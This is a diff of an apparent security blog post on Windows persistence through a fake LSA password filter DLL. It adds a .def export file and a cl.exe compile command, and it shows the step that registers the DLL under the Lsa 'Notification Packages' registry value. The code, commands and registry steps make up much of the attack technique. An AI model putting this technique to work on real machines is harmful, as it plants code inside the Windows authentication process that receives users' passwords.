@@ -6,7 +6,6 @@ categories: [Malware Development,Persistence]
 tags: [persistence]     
 ---
 
-### Introduction
 
 The Local Security Authority (LSA) is a subsystem in Windows architecture that authenticates and logs users to the local systems. It's responsible for verifying password changes, login attempts, creating access tokens, and performing general Windows authentication and authorization tasks. The LSA also contains the Local Security Policy, which contains aspects about everything related to local security. 
 
@@ -30,8 +29,7 @@ This function validates the newly created password
 - `PasswordChangeNotify`
 This is the function that gets called when the password is successfully changed
 
-
-Let's observe a simple implementation, which will open a cmd shell and display the message "Persistence!" if our method is successful.
+Here is a simple implementation, which will open a cmd shell and display the message "Persistence!" if our method is successful. Let's name this file `filter.cpp` 
 
 ```cpp
 #include <windows.h>
@@ -88,7 +86,23 @@ BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING Fu
 }
 ```
 
-To register this "password filter" we need to change the `Notification Packages` entry in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key to contain the name of our DLL. But first, let's see the current value of the aforementioned entry:
+We also need to export the functions we defined, by creating a file `filter.def`.
+
+```
+LIBRARY
+EXPORTS
+  InitializeChangeNotify
+  PasswordFilter
+  PasswordChangeNotify
+```
+
+Finally, to create our DLL we can compile those two as such:
+
+```cmd
+cl.exe /W0 /D_USRDLL /D_WINDLL filter.cpp filter.def /MT /link /DLL /OUT:filter.dll
+```
+
+To register this fake "password filter" we need to change the `Notification Packages` entry in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key to contain the name of our DLL. But first, let's see the current value of the aforementioned entry:
 
 ```cmd
 reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" 
